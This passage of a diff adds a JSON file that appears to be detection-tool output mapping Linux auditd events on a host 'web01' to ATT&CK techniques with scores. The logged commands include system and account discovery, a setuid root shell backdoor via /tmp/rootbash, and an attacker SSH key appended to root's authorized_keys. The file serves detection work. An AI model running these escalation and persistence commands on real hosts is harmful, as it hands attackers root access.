+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1564.004",
+          "name": "NTFS File Attributes",
+          "confidence": "low",
+          "score": 0.027261455469357293,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1059.004",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 6,
+      "ts": "2026-10-06T10:03:35",
+      "host": "web01",
+      "user": "www-data",
+      "process": "id",
+      "parent_process": "bash",
+      "command_line": "id",
+      "command_line_full": "id",
+      "message": "discovery",
+      "raw": {
+        "@timestamp": "2026-10-06T10:03:35Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "id",
+        "process.parent.name": "bash",
+        "process.command_line": "id",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.7778710758094809,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1018",
+          "name": "Remote System Discovery",
+          "confidence": "low",
+          "score": 0.5615634804569573,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1033",
+          "name": "System Owner/User Discovery",
+          "confidence": "low",
+          "score": 0.5521464980562852,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.4679505239536813,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1518.001",
+          "name": "Security Software Discovery",
+          "confidence": "low",
+          "score": 0.41678442507521096,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.4018707994400086,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.37532383739780023,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.36628754611725134,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1087.001",
+          "name": "Local Account",
+          "confidence": "low",
+          "score": 0.36580971360905007,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1057",
+          "name": "Process Discovery",
+          "confidence": "low",
+          "score": 0.36176139650730077,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1083",
+          "name": "File and Directory Discovery",
+          "confidence": "low",
+          "score": 0.35873049553830205,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1049",
+          "name": "System Network Connections Discovery",
+          "confidence": "low",
+          "score": 0.35101743967729804,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.33285496593015457,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1007",
+          "name": "System Service Discovery",
+          "confidence": "low",
+          "score": 0.32710960527471156,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1555.003",
+          "name": "Credentials from Web Browsers",
+          "confidence": "low",
+          "score": 0.3224150141807225,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1069.001",
+          "name": "Local Groups",
+          "confidence": "low",
+          "score": 0.3056417013436739,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1016",
+          "name": "System Network Configuration Discovery",
+          "confidence": "low",
+          "score": 0.3016348275194253,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.299655734633369,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.2802977317463635,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1082",
+      "primary_confidence": "low",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 7,
+      "ts": "2026-10-06T10:03:41",
+      "host": "web01",
+      "user": "www-data",
+      "process": "uname",
+      "parent_process": "bash",
+      "command_line": "uname -a",
+      "command_line_full": "uname -a",
+      "message": "discovery",
+      "raw": {
+        "@timestamp": "2026-10-06T10:03:41Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "uname",
+        "process.parent.name": "bash",
+        "process.command_line": "uname -a",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.7510066833465391,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1018",
+          "name": "Remote System Discovery",
+          "confidence": "low",
+          "score": 0.4571469730140367,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1033",
+          "name": "System Owner/User Discovery",
+          "confidence": "low",
+          "score": 0.4534818137947986,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.43634878586274756,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.40886846728963205,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.387150995094025,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.35017592369188794,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1007",
+          "name": "System Service Discovery",
+          "confidence": "low",
+          "score": 0.34704415899145497,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1518.001",
+          "name": "Security Software Discovery",
+          "confidence": "low",
+          "score": 0.3403104228198581,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1083",
+          "name": "File and Directory Discovery",
+          "confidence": "low",
+          "score": 0.3132136301827577,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1057",
+          "name": "Process Discovery",
+          "confidence": "low",
+          "score": 0.2988726488006319,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1016",
+          "name": "System Network Configuration Discovery",
+          "confidence": "low",
+          "score": 0.2975175647822071,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.2919200051319242,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1049",
+          "name": "System Network Connections Discovery",
+          "confidence": "low",
+          "score": 0.28902620956516584,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.27848833493772013,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1555.003",
+          "name": "Credentials from Web Browsers",
+          "confidence": "low",
+          "score": 0.26735150263297647,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.26723971095047544,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.25616778957563213,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.2509692489402648,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1082",
+      "primary_confidence": "low",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 8,
+      "ts": "2026-10-06T10:03:58",
+      "host": "web01",
+      "user": "www-data",
+      "process": "cat",
+      "parent_process": "bash",
+      "command_line": "cat /etc/passwd",
+      "command_line_full": "cat /etc/passwd",
+      "message": "account discovery",
+      "raw": {
+        "@timestamp": "2026-10-06T10:03:58Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "cat",
+        "process.parent.name": "bash",
+        "process.command_line": "cat /etc/passwd",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "account discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1003.008",
+          "name": "/etc/passwd and /etc/shadow",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: cat /etc/passwd"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.07455138021280903,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.04664576931878903,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1078.003",
+          "name": "Local Accounts",
+          "confidence": "low",
+          "score": 0.045892888095140874,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1201",
+          "name": "Password Policy Discovery",
+          "confidence": "low",
+          "score": 0.040518047941852625,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1018",
+          "name": "Remote System Discovery",
+          "confidence": "low",
+          "score": 0.0379039770602766,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1087.001",
+          "name": "Local Account",
+          "confidence": "low",
+          "score": 0.036336090154491726,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1083",
+          "name": "File and Directory Discovery",
+          "confidence": "low",
+          "score": 0.03617721790697401,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1555.003",
+          "name": "Credentials from Web Browsers",
+          "confidence": "low",
+          "score": 0.035041317288069904,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.03192100353066353,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.031111153548795303,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1033",
+          "name": "System Owner/User Discovery",
+          "confidence": "low",
+          "score": 0.02975332765719541,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1098",
+          "name": "Account Manipulation",
+          "confidence": "low",
+          "score": 0.02820331123934421,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "confidence": "low",
+          "score": 0.028032614920244888,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1552.003",
+          "name": "Shell History",
+          "confidence": "low",
+          "score": 0.0277667196102215,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1518.001",
+          "name": "Security Software Discovery",
+          "confidence": "low",
+          "score": 0.027137887058595142,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1217",
+          "name": "Browser Information Discovery",
+          "confidence": "low",
+          "score": 0.026962319423804358,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.025732973605883627,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1136.001",
+          "name": "Local Account",
+          "confidence": "low",
+          "score": 0.025651877391247604,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.023721144931109443,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1003.008",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 9,
+      "ts": "2026-10-06T10:05:10",
+      "host": "web01",
+      "user": "www-data",
+      "process": "find",
+      "parent_process": "bash",
+      "command_line": "find / -perm -4000 -type f",
+      "command_line_full": "find / -perm -4000 -type f",
+      "message": "SUID discovery",
+      "raw": {
+        "@timestamp": "2026-10-06T10:05:10Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "find",
+        "process.parent.name": "bash",
+        "process.command_line": "find / -perm -4000 -type f",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "SUID discovery"
+      },
+      "techniques": [
+        {
+          "technique": "T1552.001",
+          "name": "Credentials In Files",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: find / -perm -4000 -type f"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.36260180886537385,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1083",
+          "name": "File and Directory Discovery",
+          "confidence": "low",
+          "score": 0.32499659900690475,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1552.004",
+          "name": "Private Keys",
+          "confidence": "low",
+          "score": 0.30327704502906355,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1018",
+          "name": "Remote System Discovery",
+          "confidence": "low",
+          "score": 0.2541635739245129,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1033",
+          "name": "System Owner/User Discovery",
+          "confidence": "low",
+          "score": 0.24948846231395344,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.24901346411526656,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.17497487081370638,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1057",
+          "name": "Process Discovery",
+          "confidence": "low",
+          "score": 0.1727573495765351,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.1695173412322181,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.15246457643666647,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1069.001",
+          "name": "Local Groups",
+          "confidence": "low",
+          "score": 0.14925258284773307,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1217",
+          "name": "Browser Information Discovery",
+          "confidence": "low",
+          "score": 0.14714684018650623,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1518.001",
+          "name": "Security Software Discovery",
+          "confidence": "low",
+          "score": 0.14705414738731803,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1069.002",
+          "name": "Domain Groups",
+          "confidence": "low",
+          "score": 0.13947937909619237,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1049",
+          "name": "System Network Connections Discovery",
+          "confidence": "low",
+          "score": 0.1392417831247893,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1564.004",
+          "name": "NTFS File Attributes",
+          "confidence": "low",
+          "score": 0.13495760521739045,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1005",
+          "name": "Data from Local System",
+          "confidence": "low",
+          "score": 0.1258788232412147,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1016",
+          "name": "System Network Configuration Discovery",
+          "confidence": "low",
+          "score": 0.12224579248178169,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.11892055216780387,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1552.001",
+      "primary_confidence": "medium",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 10,
+      "ts": "2026-10-06T10:06:22",
+      "host": "web01",
+      "user": "www-data",
+      "process": "cp",
+      "parent_process": "bash",
+      "command_line": "cp /bin/bash /tmp/rootbash",
+      "command_line_full": "cp /bin/bash /tmp/rootbash",
+      "message": "privesc prep",
+      "raw": {
+        "@timestamp": "2026-10-06T10:06:22Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "cp",
+        "process.parent.name": "bash",
+        "process.command_line": "cp /bin/bash /tmp/rootbash",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "privesc prep"
+      },
+      "techniques": [
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 1.0,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.4998138540916714,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1056.001",
+          "name": "Keylogging",
+          "confidence": "low",
+          "score": 0.3937293051446869,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.008",
+          "name": "Clear Mailbox Data",
+          "confidence": "low",
+          "score": 0.37545425180879505,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.36086734172917273,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.36038475341846715,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.3534765675897292,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1555.003",
+          "name": "Credentials from Web Browsers",
+          "confidence": "low",
+          "score": 0.3512814750807672,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "confidence": "low",
+          "score": 0.3197361686607025,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027.002",
+          "name": "Software Packing",
+          "confidence": "low",
+          "score": 0.2989111782357008,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1546.005",
+          "name": "Trap",
+          "confidence": "low",
+          "score": 0.274434298949096,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.2706478444881595,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.26207083628735633,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.25769182454544814,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1036.003",
+          "name": "Rename Legitimate Utilities",
+          "confidence": "low",
+          "score": 0.24989129763223034,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.24038306212111857,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.001",
+          "name": "Launch Agent",
+          "confidence": "low",
+          "score": 0.2149351438369732,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.2029087164815211,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1036",
+          "name": "Masquerading",
+          "confidence": "low",
+          "score": 0.20044963888807588,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1115",
+          "name": "Clipboard Data",
+          "confidence": "low",
+          "score": 0.18872454676751163,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1059.004",
+      "primary_confidence": "low",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 11,
+      "ts": "2026-10-06T10:06:24",
+      "host": "web01",
+      "user": "www-data",
+      "process": "chmod",
+      "parent_process": "bash",
+      "command_line": "chmod u+s /tmp/rootbash",
+      "command_line_full": "chmod u+s /tmp/rootbash",
+      "message": "setuid backdoor",
+      "raw": {
+        "@timestamp": "2026-10-06T10:06:24Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "chmod",
+        "process.parent.name": "bash",
+        "process.command_line": "chmod u+s /tmp/rootbash",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "setuid backdoor"
+      },
+      "techniques": [
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: chmod u+s /tmp/rootbash"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.07658280812345097,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1222.002",
+          "name": "Linux and Mac Permissions",
+          "confidence": "low",
+          "score": 0.060616377698856756,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.03367763742795741,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.030701191638155552,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "low",
+          "score": 0.02394066923684627,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.023625474580863483,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1053.005",
+          "name": "Scheduled Task",
+          "confidence": "low",
+          "score": 0.020638857459652132,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "low",
+          "score": 0.019359023664660722,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.018848033501557653,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1555.003",
+          "name": "Credentials from Web Browsers",
+          "confidence": "low",
+          "score": 0.01853165623316676,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.01679893219552958,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "low",
+          "score": 0.016221711159028197,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.016027038387745815,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1056.001",
+          "name": "Keylogging",
+          "confidence": "low",
+          "score": 0.01578283669011924,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1195.002",
+          "name": "Compromise Software Supply Chain",
+          "confidence": "low",
+          "score": 0.015670824345268373,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1564.004",
+          "name": "NTFS File Attributes",
+          "confidence": "low",
+          "score": 0.01563001468785154,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.015080589909586922,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.014624715052973174,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.014593191090778071,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1548.001",
+      "primary_confidence": "high",
+      "channel": "auditd",
+      "event_id": "execve"
+    },
+    {
+      "index": 12,
+      "ts": "2026-10-06T10:07:50",
+      "host": "web01",
+      "user": "root",
+      "process": "bash",
+      "parent_process": "rootbash",
+      "command_line": "echo 'ssh-rsa AAAAB3NzaC1yc2attacker root@evil' >> /root/.ssh/authorized_keys",
+      "command_line_full": "echo 'ssh-rsa AAAAB3NzaC1yc2attacker root@evil' >> /root/.ssh/authorized_keys",
+      "message": "ssh key persistence",
+      "raw": {
+        "@timestamp": "2026-10-06T10:07:50Z",
+        "host.name": "web01",
+        "user.name": "root",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "bash",
+        "process.parent.name": "rootbash",
+        "process.command_line": "echo 'ssh-rsa AAAAB3NzaC1yc2attacker root@evil' >> /root/.ssh/authorized_keys",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "ssh key persistence"
+      },
+      "techniques": [
+        {
+          "technique": "T1098.004",
+          "name": "SSH Authorized Keys",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: echo 'ssh-rsa AAAAB3NzaC1yc2attacker root@evil' >>..."
+        },
+        {
+          "technique": "T1553.004",
+          "name": "Install Root Certificate",
+          "confidence": "medium",
+          "score": 0.0573897049732936,
+          "source": "heuristic",
+          "evidence": "KB search match on: echo 'ssh-rsa AAAAB3NzaC1yc2attacker root@evil' >>..."
+        },
+        {
+          "technique": "T1552.004",
+          "name": "Private Keys",
+          "confidence": "low",
+          "score": 0.06460970351818557,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.06087207606435578,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "low",
+          "score": 0.05697880947649227,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1548.001",
+          "name": "Setuid and Setgid",
+          "confidence": "low",
+          "score": 0.05542545660314092,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1685",
